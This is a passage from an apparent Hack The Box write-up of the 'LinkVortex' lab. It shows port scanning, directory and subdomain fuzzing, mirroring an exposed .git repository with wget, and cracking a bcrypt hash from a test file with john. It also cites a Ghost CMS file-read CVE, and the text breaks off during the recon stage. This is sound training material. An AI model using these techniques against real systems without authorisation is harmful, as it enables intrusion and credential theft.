---
{"dg-publish":true,"permalink":"/ct-fs/htb/linkvortex/","dgShowFileTree":true,"dg-note-properties":{}}
---

# By 0xCapra_Daemon aka Will Keller
#linux #git #sqlinjection #racecondition #TOCTOU

This one is a doozy so buckle up...
## Recon
![Pasted image 20260805125014.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805125014.png)

## Nmap:
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/linkvortex/scanning]
└─$ nmap -A -p22,80 -Pn -T4 -oA nmap_threader3k 10.129.231.194
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 16:01 -0400
Nmap scan report for 10.129.231.194
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   89.62 ms 10.10.14.1
2   90.89 ms 10.129.231.194

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.59 second
```
Initial portscan (shoutout Tyler Ramesby for the `nmap` Aggro scan) reveals open ports on 22 (ssh) and 80 (webserver). Adding `linkvortex.htb` to `/etc/hosts`
### Port 80
![Pasted image 20260805130757.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805130757.png)
visiting the site in the browser reveals what appears to be a wiki/data driven site on computer parts that are easy-to-understand.

![Pasted image 20260805130904.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805130904.png)
![Pasted image 20260805131016.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805131016.png)
There's also a `/about` page with general boilerplate copy. As well as a signup button at the bottom, but before we get into that, Let's look under the hood for more details.

```html

┌──(kali㉿kali)-[~/CTF/HTB/linkvortex/scanning]
└─$ curl -v http://linkvortex.htb
* Host linkvortex.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.231.194
*   Trying 10.129.231.194:80...
* Established connection to linkvortex.htb (10.129.231.194 port 80) from 10.10.14.192 port 60542 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: linkvortex.htb
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 05 Aug 2026 20:10:46 GMT
< Server: Apache
< X-Powered-By: Express
< Cache-Control: public, max-age=0
< Content-Type: text/html; charset=utf-8
< Content-Length: 12148
< ETag: W/"2f74-ets9KgxQNjYohjAU+Z2qnqzvdgY"
< Vary: Accept-Encoding
< 
<!DOCTYPE html>
<html lang="en">
<head>

    <title>BitByBit Hardware</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=a2d18c7458" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=a2d18c7458" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=a2d18c7458" />

    <meta name="description" content="Your trusted source for detailed, easy-to-understand computer parts info">
    <link rel="canonical" href="http://linkvortex.htb/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="BitByBit Hardware">
    <meta property="og:type" content="website">
    <meta property="og:title" content="BitByBit Hardware">
    <meta property="og:description" content="Your trusted source for detailed, easy-to-understand computer parts info">
    <meta property="og:url" content="http://linkvortex.htb/">
    <meta property="article:publisher" content="https://www.facebook.com/ghost">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="BitByBit Hardware">
    <meta name="twitter:description" content="Your trusted source for detailed, easy-to-understand computer parts info">
    <meta name="twitter:url" content="http://linkvortex.htb/">
    <meta name="twitter:site" content="@ghost">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "WebSite",
    "publisher": {
        "@type": "Organization",
        "name": "BitByBit Hardware",
        "url": "http://linkvortex.htb/",
        "logo": {
            "@type": "ImageObject",
            "url": "http://linkvortex.htb/favicon.ico"
        }
    },
    "url": "http://linkvortex.htb/",
    "mainEntityOfPage": "http://linkvortex.htb/",
    "description": "Your trusted source for detailed, easy-to-understand computer parts info"
}
    </script>

    <meta name="generator" content="Ghost 5.58">
    <link rel="alternate" type="application/rss+xml" title="BitByBit Hardware" href="http://linkvortex.htb/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="054f7096476b0e8c7ec591c72c" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="http://linkvortex.htb/" crossorigin="anonymous"></script>
    
    <link href="http://linkvortex.htb/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=a2d18c7458"></script><style>:root {--ghost-accent-color: #1c1719;}</style>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=a2d18c7458">

</head>
<body class="home-template is-head-left-logo has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo no-image" href="http://linkvortex.htb">
                        BitByBit Hardware
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home nav-current"><a href="http://linkvortex.htb/">Home</a></li>
    <li class="nav-about"><a href="http://linkvortex.htb/about/">About</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        
<div class="site-header-content outer">


        <div class="site-header-inner inner">
                    <h1 class="site-title">BitByBit Hardware</h1>
                <p class="site-description">Your trusted source for detailed, easy-to-understand computer parts info</p>
        </div>

</div>

<main id="site-main" class="site-main outer">
<div class="inner posts">

    <div class="post-feed">
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/psu/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The Power Supply
                </h2>
            </header>
                <div class="post-card-excerpt">A power supply unit (PSU) converts the alternating current (AC) from your wall outlet into direct current (DC) that the computer components require. It supplies power to the motherboard, CPU, GPU, storage drives, fans, and other peripherals. Without a functioning PSU, a computer cannot operate.

Functions of a Power Supply</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-08-05">Aug 5, 2024</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/storage-drive/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The CMOS
                </h2>
            </header>
                <div class="post-card-excerpt">CMOS is a type of semiconductor technology used to store small amounts of data on the motherboard. This data includes system settings and configuration information required for the computer to boot correctly. In modern systems, CMOS technology is primarily used in the CMOS RAM chip, which is powered by a</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-05-07">May 7, 2024</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/vga/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The Video Graphics Array
                </h2>
            </header>
                <div class="post-card-excerpt">The term VGA can refer to either the Video Graphics Array specification or the physical VGA connector often used for computer video output. Below, I'll provide a comprehensive overview of both aspects to give you a full understanding of VGA in the context of computer hardware and display technology.


Video</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-04-16">Apr 16, 2024</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ram/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The Random Access Memory
                </h2>
            </header>
                <div class="post-card-excerpt">Random Access Memory (RAM) is a crucial component in all computing devices, serving as the main short-term data storage space. RAM stores the data and programs that a CPU needs in real time or near real time. Unlike hard drives or SSDs (Solid State Drives), which store data permanently, RAM</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-04-01">Apr 1, 2024</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/cmos/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The Motherboard
                </h2>
            </header>
                <div class="post-card-excerpt">A motherboard is a complex printed circuit board (PCB) that facilitates communication between all critical electronic components of a computer, including the CPU (Central Processing Unit), memory (RAM), storage devices, video cards, and other peripheral devices. It distributes power to these components and allows for communication between the CPU, memory,</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-03-11">Mar 11, 2024</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/cpu/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The Central Processing Unit
                </h2>
            </header>
                <div class="post-card-excerpt">The Central Processing Unit (CPU), often simply referred to as the processor, is the primary component of a computer that performs most of the processing inside a computer. To understand its significance, it's important to dive into its architecture, functions, and how it integrates within the broader context of computer</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-12-11">Dec 11, 2023</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
    </div>

    <nav class="pagination">
    <span class="page-number">Page 1 of 1</span>
</nav>


</div>
</main>

    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="http://linkvortex.htb">BitByBit Hardware</a> &copy; 2026</section>
            <nav class="site-footer-nav">
                <ul class="nav">
    <li class="nav-sign-up nav-current"><a href="#/portal/">Sign up</a></li>
</ul>

            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=a2d18c7458"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>



</body>
</html>

```
We can see that this app uses `casperjs` for it's front-end paired with `jsdelivr` CDN that's serving something called `ghost`.

Immediately upon searching for `ghost 5.58` online we are met with a [CVE](https://nvd.nist.gov/vuln/detail/CVE-2023-40028) that explains an arbitrary file read vulnerability within Ghost CMS.
>[!info]
>![Pasted image 20260805131614.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805131614.png)
We can see from the description that an authenticated user on this CMS can upload files that are symlinks causing users to be able to read any system file they wish. This may come in handy if we can get a session on the app.

With that in mind, it may be time to revisit the signup button...

![Pasted image 20260805132037.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805132037.png)
When clicking the signup button, we see that it responds by redirecting us to `/#/portal` which tells the server to ignore everything after the `#`. However, online research shows:
>[!info]
>![Pasted image 20260805132246.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805132246.png)
>In js heavy applications this schema is sometimes used to get the frontend java to serve something up to the browser instead of the backend server. 

In our case, it doesn't pop a `portal`, but this may be a js error in our browser.

![Pasted image 20260805132621.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805132621.png)
Even though we couldn't get a signup portal to pop, we do see some blog entries at the bottom of the page. This is a common setup for wordpress sites.

![Pasted image 20260805132748.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805132748.png)
Clicking through to the article we see there's an author `admin`. Let's see if we can check out their user profile.

![Pasted image 20260805134005.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805134005.png)
We can navigate to the author page for `admin`. However, `wpscan` comes back with no wordpress running error. We'll dig deeper into Ghost CMS docs to see if there are generic paths to signup/authenticate.


#### Gobuster
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/linkvortex/scanning]
└─$ gobuster dir -u http://linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,html,css,js,json,zip,py,sh -t 20 --exclude-length 0 | tee ./gobuster_80
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://linkvortex.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              zip,py,sh,php,html,css,js,json
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
LICENSE              (Status: 200) [Size: 1065]
assets               (Status: 301) [Size: 179] [--> /assets/]
.                    (Status: 200) [Size: 12148]
server-status        (Status: 403) [Size: 199]
```
Initial subdirectory scanning shows just an `assets` directory and `.` indicating our current or webroot directory (index).

```zsh
[16:52:32] Starting: 
[16:52:58] 301 -  179B  - /assets  ->  /assets/
Added to the queue: assets/
[16:52:58] 301 -    0B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp/
[16:52:58] 301 -    0B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp/
[16:52:58] 301 -    0B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp/
[16:53:03] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js/
[16:53:11] 301 -    0B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf/
[16:53:11] 301 -    0B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf/
[16:53:13] 301 -    0B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf/
[16:53:13] 200 -   15KB - /favicon.ico
[16:53:17] 301 -    0B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf/
[16:53:22] 200 -    1KB - /LICENSE
[16:53:38] 200 -  103B  - /robots.txt
[16:53:39] 403 -  199B  - /server-status/
Added to the queue: server-status/
[16:53:39] 403 -  199B  - /server-status
[16:53:41] 200 -  254B  - /sitemap.xml

```
Dirsearch on the webroot shows a 200 response for `/robots.txt`

![Pasted image 20260805135557.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805135557.png)
Visiting `robots.txt` reveals several interesting subdirectories worth enumerating.
![Pasted image 20260805144219.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805144219.png)
Upon visiting `/ghost/` we see it redirect us to `/ghost/#/signin` with a simple auth portal for an email and password. Inputting random data we get a more verbose error indicating that we may have user validation opportunities.

![Pasted image 20260805144409.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805144409.png)
Guessing with low-hanging-fruit we do validate that `admin@linkvortex.htb` is a valid user on this application. Let's see if we can fuzz for more.

### FFuF (subdomains)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/linkvortex/scanning]
└─$ ffuf -v -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

[Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 92ms]
| URL | http://linkvortex.htb
    * FUZZ: dev
```
we do see a `dev.linkvortex.htb` that comes back with a 200 response, so we'll add it to our hosts file.

![Pasted image 20260805163610.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805163610.png)
Visiting in the browser shows us a "Launching Soon" splash page. 
### Dirsearch (dev)
```zsh

```
Dirsearch reveals a git repo at `/.git`

![Pasted image 20260805164412.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260805164412.png)
Browser confirms a publicly available git repo on this machine. Let's see if we can enumerate it

### Git
```zsh
(kali㉿kali)-[~/…/HTB/linkvortex/files/git]
└─$ wget -np -r 'http://dev.linkvortex.htb/.git/'   
--2026-08-05 19:46:34--  http://dev.linkvortex.htb/.git/
Resolving dev.linkvortex.htb (dev.linkvortex.htb)... 10.129.79.205
Connecting to dev.linkvortex.htb (dev.linkvortex.htb)|10.129.79.205|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2796 (2.7K) [text/html]

---snip---
FINISHED --2026-08-05 19:46:50--
Total wall clock time: 16s
Downloaded: 116 files, 18M in 5.4s (3.33 MB/s
```
Successfully exfiled this repo to our attacker machine.

```zsh
-      - uses: daniellockyer/mysql-action@main
-        if: matrix.env.DB == 'mysql8'
-        with:
-          authentication plugin: 'caching_sha2_password'
-          mysql version: '8.0'
-          mysql database: 'ghost_testing'
-          mysql root password: 'root'
  
+++ b/.github/FUNDING.yml
@@ -0,0 +1,3 @@
+# You can add one username per supported platform and one custom link
+github: tryghost
+open_collective: ghost
```
```zsh
┌──(kali㉿kali)-[~/…/linkvortex/files/git/dev.linkvortex.htb]
└─$ git log   
commit 299cdb4387763f850887275a716153e84793077d (HEAD, tag: v5.58.0)
Author: Ghost CI <41898282+github-actions[bot]@users.noreply.github.com>
Date:   Fri Aug 4 15:02:54 2023 +0000

    v5.58.0

commit dce2e68c9a620e9534f723a94dbb5f33c9e43034
Author: Djordje Vlaisavljevic <dzvlais@gmail.com>
Date:   Fri Aug 4 15:15:57 2023 +0100

    Added Tips&Donations link to portal links (#17580)
    
    refs https://github.com/TryGhost/Product/issues/3677
    
    - Added Tips&Donations link to Portal links in Membership settings for
    easy access
    - Updated other links to pass `no-action` lint rule
    
    ---------
    
    Co-authored-by: Sag <guptazy@gmail.com>

commit 356256067c378590d2ffc77906b04aea69d3b36b
Author: Sam Lord <sam@ghost.org>
Date:   Fri Aug 4 13:07:20 2023 +0100

    Data generator: Ensure order of newsletters is correct
    
    no issue

commit 4ff467794f60e4e6ae6935bafc5d72c94c145837
Author: Sam Lord <sam@ghost.org>
Date:   Wed Aug 2 14:43:26 2023 +0100

    Entirely rewrote data generator to simplify codebase
    
    refs: https://github.com/TryGhost/DevOps/issues/11
    
    This is a pretty huge commit, but the relevant points are:
    * Each importer no longer needs to be passed a set of data, it just gets the data it needs
    * Each importer specifies its dependencies, so that the order of import can be determined at runtime using a topological sort
    * The main data generator function can just tell each importer to import the data it has
    
    This makes working on the data generator much easier.
    
    Some other benefits are:
    * Batched importing, massively speeding up the whole process
    * `--tables` to set the exact tables you want to import, and specify the quantity of each

commit cf947bc4d6a3b56791488afd8c2016b95eee7df1
Author: Jono M <reason.koan@gmail.com>
Date:   Fri Aug 4 12:24:19 2023 +0100

    Optimised react-query caching to prevent excessive requests (#17595)
    
    refs https://github.com/TryGhost/Product/issues/3349

commit 77cc6df64a2237337e301e633c7399367754fc9c
Author: Peter Zimon <zimo@ghost.org>
Date:   Fri Aug 4 11:42:54 2023 +0200

    AdminX Newsletters refinements (#17594)
    
    refs. https://github.com/TryGhost/Product/issues/3601
    
    - added tableCell hover pointer cursor
    - updated Stripe connect button copy
    - added bottom margin to main container for better scrolling / navigation highlighting

commit 24ea4c0fb9a4e71dc23aafbcbf144ac105873ac5
Author: Djordje Vlaisavljevic <dzvlais@gmail.com>
Date:   Thu Aug 3 22:46:26 2023 +0100

    Updated Tips&Donations portal success and loading states design (#17592)
    
    refs https://github.com/TryGhost/Product/issues/3677
    
    - Updated portal loading design when user clicks on a Tips&Donations
    link
    - Removed "Retry" button from error state and added "Close"

commit be7a2d0aec8505d8f99de51320dcbb867247bd50
Author: Djordje Vlaisavljevic <dzvlais@gmail.com>
Date:   Thu Aug 3 22:37:25 2023 +0100

    Updated Tips & donations settings design (#17591)
    
    refs https://github.com/TryGhost/Product/issues/3667
    
    - Moved Tips&Donations out of `SignupFormEmbed` component and into its
    own component
    - Removed the enable/disable toggle for Tips&Donations and added
    Expand/Close button instead

commit 7f6de07b1efa768c15861de07b793d14767f433e
Author: Sag <guptazy@gmail.com>
Date:   Thu Aug 3 23:00:42 2023 +0200

    Removed unconsistent success state from the donation page (#17590)
    
    refs https://github.com/TryGhost/Product/issues/3650

commit 7e9b2d4883c3c287d2cff78a30a7b29df2573b10
Author: Sag <guptazy@gmail.com>
Date:   Thu Aug 3 22:45:57 2023 +0200

    Fixed donations checkout for logged-off readers (#17589)
    
    closes https://github.com/TryGhost/Product/issues/3663

commit 19bdb0efef63026ced69aa65c01b25e4e4b0b623
Author: Sag <guptazy@gmail.com>
Date:   Thu Aug 3 22:13:47 2023 +0200

    Added migrations for Tips & Donations' settings (#17576)
    
    closes https://github.com/TryGhost/Product/issues/3668
    
    - Tips and Donations feature offers two settings: "donations_currency", and "donations_suggested_amount"
        - "donation_currency": the currency to be used for the donation. Defaults to "USD", not nullable.
        - "donation_suggested_amount": an anchor price for the donation. Defaults to 0, not nullable.
    - Both settings belong to a new group "donations"
    
    Tech Spec: https://www.notion.so/ghost/Tech-Spec-5cd6929f7960462ebcbf198176e0d899?pvs=4#6e8b34c45f0c4c78b48c9e7725a307c8

commit c06ba9bec909a1f6729787ca3b5b5f84661c5cb1
Author: John O'Nolan <john@onolan.org>
Date:   Thu Aug 3 20:41:10 2023 +0100

    2023 (2)

commit 265e62229f7ab45bfa420a251370390b8649ac1d
Author: John O'Nolan <john@onolan.org>
Date:   Thu Aug 3 20:40:44 2023 +0100

    2023

commit 21f57c5ab5ba9f413facb92798bf05e9951636db
Author: Jono M <reason.koan@gmail.com>
Date:   Thu Aug 3 18:26:59 2023 +0100

    Added remaining wiring to AdminX Newsletters (#17587)
    
    refs https://github.com/TryGhost/Product/issues/3601
    
    - Wired up add newsletter modal
    - Fixed bugs with editing newsletters
    - Added archive/reactivate modals

commit d960b1284db343a1cfe7410450f9fc328197cf4a
Author: Peter Zimon <zimo@ghost.org>
Date:   Thu Aug 3 18:32:30 2023 +0200

    Added enable newsletter toggle in AdminX settings (#17582)
    
    refs. https://github.com/TryGhost/Product/issues/3601
    
    ---------
    
    Co-authored-by: Jono Mingard <reason.koan@gmail.com>

commit af7ce52708fad34b35b9aff75e4b1730f8c3dcf4
Author: Steve Larson <9larsons@gmail.com>
Date:   Thu Aug 3 10:10:31 2023 -0500

    Added source to beta editor feedback (#17586)
    
    no refs
    - will return post, page, or settings

commit f26203f8cbbefc2aee0f8e69a830568e51f48b59
Author: Djordje Vlaisavljevic <dzvlais@gmail.com>
Date:   Thu Aug 3 15:28:11 2023 +0100

    Updated Tips & donations settings (#17585)
    
    refs https://github.com/TryGhost/Product/issues/3667
    
    - Updated Tips & Donations settings with improved copy and more compact
    layout

commit 262c6be70f136842f2fd8307cc06835264d0d726
Author: Michael Barrett <991592+mike182uk@users.noreply.github.com>
Date:   Thu Aug 3 13:26:19 2023 +0100

    🐛 Fixed member filtering on newsletter subscription status (#17583)
    
    fixes https://github.com/TryGhost/Product/issues/3684
    
    The `nql` used for filtering newsletter members needed tweaking to make
    sure the provided query was parsed as a single `AND` query. This commit
    also fixes an issue where on page reload the filters were not being
    applied correctly

commit 81ef2ade39e57c8431585d971ba6c601278441a3
Merge: c467611 34b6f19
Author: Ghost CI <41898282+github-actions[bot]@users.noreply.github.com>
Date:   Thu Aug 3 10:25:36 2023 +0000

    Merged v5.57.3 into main

commit 34b6f1917fdd2dbeeb3eea302d33295f1eace4c5 (grafted, tag: v5.57.3)
Author: Ghost CI <41898282+github-actions[bot]@users.noreply.github.com>
Date:   Thu Aug 3 10:25:34 2023 +0000

    v5.57.3

commit c46761199bb9a32feed787465ce747b43cafb1d9 (grafted)
Author: Jono M <reason.koan@gmail.com>
Date:   Thu Aug 3 09:29:14 2023 +0100

    Cleaned up AdminX API handling (#17571)
    
    refs https://github.com/TryGhost/Product/issues/3349
    
    - Simplified a few more places after switching to react-query
    - Improved how mocking works in specs to be more scalable as the number
    of queries increases
```
Full output of their commit logs. Doesn't appear to be anything in the logs. Let's enumerate the filesystem with git

### Git (filesystem)
```zsh
┌──(kali㉿kali)-[~/…/linkvortex/files/git/dev.linkvortex.htb]
└─$ git status | grep password
	deleted:    ghost/admin/app/components/modal-reset-all-passwords.hbs
	deleted:    ghost/admin/app/components/modal-reset-all-passwords.js
	deleted:    ghost/admin/app/utils/password-generator.js
	deleted:    ghost/admin/app/validators/mixins/password.js
	deleted:    ghost/admin/tests/acceptance/password-reset-test.js
	deleted:    ghost/core/core/frontend/apps/private-blogging/lib/helpers/input_password.js
	deleted:    ghost/core/core/server/api/endpoints/utils/validators/input/password_reset.js
	deleted:    ghost/core/core/server/data/migrations/versions/4.9/01-add-reset-all-passwords-permission.js
	deleted:    ghost/core/core/server/lib/validate-password.js
	deleted:    ghost/core/core/server/services/auth/passwordreset.js
	deleted:    ghost/core/core/server/services/mail/templates/raw/reset-password.html
	deleted:    ghost/core/core/server/services/mail/templates/reset-password.html
	deleted:    ghost/core/test/unit/frontend/apps/private-blogging/input_password.test.js
	deleted:    ghost/security/lib/password.js
	deleted:    ghost/security/test/password.test.js
```
Running `git status` and grepping the search term `password` just to try and narrow it down manually we see an interesting couple of files at the bottom.

```zsh
┌──(kali㉿kali)-[~/…/linkvortex/files/git/dev.linkvortex.htb]
└─$ git show HEAD:ghost/security/test/password.test.js
require('./utils');
const security = require('../');

describe('Lib: Security - Password', function () {
    it('hash plain password', function () {
        return security.password.hash('test')
            .then(function (hash) {
                hash.should.match(/^\$2[ayb]\$.{56}$/);
            });
    });

    it('compare password', function () {
        return security.password.compare('test', '$2a$10$we16f8rpbrFZ34xWj0/ZC.LTPUux8ler7bcdTs5qIleN6srRHhilG')
            .then(function (valid) {
                valid.should.be.true;
            });
    });
});

```
Reading out `ghost/security/test/password.test.js` we see a plaintext password for `test` as well as a hash to compare it to.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/linkvortex/files]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt admin_hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:08:14 0.65% (ETA: 12:41:18) 0g/s 225.9p/s 225.9c/s 225.9C/s iloveralph..illuminate
test             (?)     
1g 0:00:12:28 DONE (2026-08-06 15:51) 0.001335g/s 221.9p/s 221.9c/s 221.9C/s thanhtam..teleport
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
we do crack it with `john` to be sure it's actually `test`.

![Pasted image 20260806130018.png](/img/user/CTFs/HTB/Images/Linkvortex%20Images/Pasted%20image%2020260806130018.png)
However trying that in the browser give us a password is incorrect error.

```zsh
diff --git a/Dockerfile.ghost b/Dockerfile.ghost
new file mode 100644
index 0000000..50864e0
--- /dev/null
+++ b/Dockerfile.ghost
@@ -0,0 +1,16 @@
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
